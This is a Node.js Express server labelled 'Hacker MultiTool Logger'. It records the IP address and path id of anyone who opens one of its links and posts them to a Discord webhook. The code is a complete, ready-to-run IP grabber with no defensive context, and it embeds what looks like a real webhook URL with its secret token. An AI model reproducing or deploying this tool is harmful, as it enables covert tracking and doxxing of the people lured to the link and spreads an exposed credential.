
const express = require("express");
const app = express();
const axios = require("axios");

const webhook = "https://discord.com/api/webhooks/1369767320452599858/L039GYA7Vi8nJphhlxwyDVIVBGPD9ntgn2SGVsHaF2TPjdLAmJXexMsMl78ePhZyswlw"; // insert at runtime optionally

app.get("/:id", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const userId = req.params.id;

  axios.post(webhook, {
    embeds: [
      {
        title: "📡 New IP Logged",
        color: 0xff0000,
        fields: [
          { name: "IP", value: ip },
          { name: "User Path", value: userId }
        ],
        footer: { text: "Hacker MultiTool Logger" },
        timestamp: new Date()
      }
    ]
  });

  res.send("IP Logged. You may close this tab.");
});

app.listen(3000, () => {
  console.log("Logger running on port 3000");
});
